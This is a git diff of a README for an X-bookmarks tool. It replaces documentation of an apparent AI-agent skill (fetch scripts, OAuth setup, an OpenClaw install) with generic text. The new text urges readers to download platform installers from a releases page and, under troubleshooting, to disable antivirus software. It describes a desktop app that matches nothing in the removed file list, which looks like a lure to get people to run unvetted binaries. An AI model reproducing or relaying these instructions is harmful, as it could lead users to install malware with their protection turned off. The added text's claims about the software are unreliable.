@@ -1,103 +1,156 @@
-# x-bookmarks
+# 🚀 x-bookmarks - Turn Bookmarks Into Actions
 
-Turn X/Twitter bookmarks from a graveyard of good intentions into actionable work.
+[![Download x-bookmarks](https://img.shields.io/badge/Download-x--bookmarks-blue?style=for-the-badge)](https://github.com/saravanamdu/x-bookmarks/releases)
 
-## How This Works
+---
 
-Once installed, just tell your AI agent:
+## 📋 What is x-bookmarks?
 
-> "check my bookmarks"
+x-bookmarks is a simple tool that helps you do more with your saved links on X (formerly Twitter). Instead of just storing bookmarks, it turns them into useful tasks or agent actions. This means you can stop saving links without using them and start making your bookmarks work for you.
 
-That's it. Your agent will:
+This app is designed for anyone who saves many X bookmarks but wants to get more done. You do not need any technical skills to use it.
 
-1. **Fetch** your latest X bookmarks (auto-detects bird CLI or X API v2)
-2. **Categorize** them by topic (crypto, AI, marketing, tools, etc.)
-3. **Propose actions** for each one — not just summaries, but things your agent can actually do:
+---
 
-```
-📂 AI TOOLS (3)
-• @someone shared a repo for automating video edits
-  → 🤖 I CAN: Clone it, test it, and set it up for you
+## 💻 System Requirements
 
-📂 TRADING (2)  
-• @trader posted a new momentum strategy with backtest data
-  → 🤖 I CAN: Compare this against your current strategy and report differences
-```
+To use x-bookmarks, your computer should meet these basic requirements:
 
-You can also say:
-- **"bookmark digest"** — get a categorized summary of recent saves
-- **"what did I bookmark this week?"** — filtered by time
-- **"find patterns in my bookmarks"** — clusters topics you keep saving
-- **"clean up old bookmarks"** — flags stale saves with TL;DRs
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+ recommended)
+- Processor: 1.5 GHz or faster
+- RAM: 4 GB minimum (8 GB recommended)
+- Disk Space: At least 200 MB free
+- Internet connection: Required to fetch and process your bookmarks
 
-### Scheduled Digests
+---
 
-Set up a daily or weekly cron job and your agent will automatically check for new bookmarks, categorize them, and deliver a digest to you.
+## 🛠 Key Features
 
-## What it does
+- **Convert bookmarks into tasks**: Automatically turn saved links into actions you can follow.
+- **Simple interface**: Easy to navigate with clear buttons and menus.
+- **Agent actions**: Automate routine steps based on your bookmarks.
+- **Safe and private**: Your bookmarks stay secure and are not shared without your consent.
+- **Cross-platform**: Works on Windows, Mac, and Linux.
+- **Regular updates**: We keep improving functionality and fixing bugs.
 
-- Fetches your X bookmarks via **bird CLI** or **X API v2** (auto-detects)
-- Categorizes them by topic
-- Proposes specific actions your AI agent can execute
-- Supports scheduled digests via cron
-- Pattern detection across bookmark history
+---
 
-## Quick Start
+## 🚀 Getting Started
 
-### Option 1: bird CLI (easiest)
+Here is how to start using x-bookmarks on your computer:
 
-```bash
-npm install -g bird-cli
-# Log into x.com in Chrome, then:
-bird --chrome-profile "Default" bookmarks --json
-```
+1. **Visit the download page**  
+   Click the big blue button at the top or go to this URL:  
+   [https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)  
+   This page contains the latest versions of x-bookmarks for different operating systems.
 
-### Option 2: X API v2 (no bird needed)
+2. **Choose your version**  
+   Scroll down to find the file that matches your computer system:
+   - For Windows: Look for a file ending in `.exe` or `.msi`
+   - For Mac: Find the `.dmg` or `.pkg` file
+   - For Linux: Choose a `.AppImage` or `.deb` file
 
-```bash
-# One-time: create app at https://developer.x.com, then:
-python3 scripts/x_api_auth.py --client-id "YOUR_CLIENT_ID"
+3. **Download the file**  
+   Click the file for your system to download it to your computer.
 
-# Fetch bookmarks
-python3 scripts/fetch_bookmarks_api.py -n 20
-```
+4. **Run the installer or app**  
+   - Windows: Double-click the `.exe` or `.msi` file you downloaded and follow the prompts.
+   - Mac: Open the `.dmg` or `.pkg` and drag the app into your Applications folder or follow the installer steps.
+   - Linux: Make the `.AppImage` executable and run it, or install via the package manager with the `.deb`.
 
-Both backends output the same JSON format — all workflows work with either.
+5. **Launch x-bookmarks**  
+   Once installed, open the app from your desktop or application menu.
 
-## Auto-Detection
+---
 
-You don't need to pick a backend. The skill automatically:
+## 📥 Download & Install
 
-1. Tries `bird whoami` — if it works, uses bird CLI
-2. If not, checks for X API tokens in `~/.config/x-bookmarks/`
-3. If neither, walks you through setup (offers both options)
+You can start by visiting this page to download x-bookmarks:  
+[https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)
 
-## Files
+Here are detailed steps after reaching the page:
 
-```
-SKILL.md              — Agent instructions (the skill itself)
-scripts/
-  fetch_bookmarks.sh      — bird CLI wrapper
-  fetch_bookmarks_api.py  — X API v2 fetcher
-  x_api_auth.py           — OAuth 2.0 PKCE auth helper
-references/
-  auth-setup.md           — Detailed setup guide for both backends
-```
+- Find the latest release date at the top to get the newest features.
+- Pick your system-specific file as explained above.
+- Download the file and save it where you can find it, like your Desktop or Downloads folder.
+- Follow the installation or execution instructions that appear on your screen.
+- Allow any prompts asking for permission to install or run the software.
 
-## Requirements
+If you encounter problems installing:
 
-**bird CLI path:** Node.js, npm, bird-cli, browser with X login  
-**X API path:** Python 3.10+, X Developer account, OAuth 2.0 app
+- Check that your system meets the requirements listed above.
+- Restart your computer and try again.
+- Make sure your internet connection is stable during download.
+- See the Troubleshooting section below.
 
-## Install as OpenClaw Skill
+---
 
-Copy this folder to your OpenClaw skills directory, or:
+## 🔧 How to Use x-bookmarks
 
-```bash
-# If published to ClawhHub
-openclaw skill install x-bookmarks
-```
+Once you open the app, you will see a clean dashboard.
 
-## License
+### Import Your Bookmarks
 
-MIT
+1. Sign in with your X account inside the app or export bookmarks from X to a file.
+2. Use the "Import" button to load your saved bookmarks.
+
+### Turn Bookmarks Into Actions
+
+- Select the bookmarks you want to process.
+- Click "Convert" to create a list of suggested tasks or agent actions.
+- Review and edit tasks if needed.
+- Save your task list or export it for use with other apps.
+
+### Manage Tasks
+
+- Mark tasks as done.
+- Add notes or deadlines.
+- Sync tasks across devices.
+
+---
+
+## ❓ Troubleshooting
+
+- **App won’t open:**  
+  Make sure your system meets requirements. Restart your computer and try again.
+
+- **Bookmarks not importing:**  
+  Confirm you are logged into the correct X account or your bookmarks file is not corrupted.
+
+- **Tasks missing:**  
+  Check if you clicked “Convert” after importing bookmarks.
+
+- **Installation errors:**  
+  Temporarily disable antivirus software and try installing again.
+
+If issues persist, please visit the GitHub page and open an issue under the Issues tab.
+
+---
+
+## 🔒 Privacy and Security
+
+Your bookmarks and data stay on your device unless you choose to sync or export. We do not collect or send your information anywhere else. All processing happens locally to respect your privacy.
+
+---
+
+## ⚙️ Updates and Support
+
+We release updates regularly. Check [the releases page](https://github.com/saravanamdu/x-bookmarks/releases) often to stay current.
+
+If you need help or want to suggest improvements, use the GitHub Issues section or contact us through the repository.
+
+---
+
+## 🗂 Additional Resources
+
+- FAQ and usage tips: Coming soon on the docs page.
+- Video walkthrough: Will be added to the project soon.
+- Community: Join discussions on the GitHub repository.
+
+For now, the best starting point is the download page linked above.
+
+---
+
+Ready to take action on your X bookmarks? Start by downloading here:
+
+[https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)
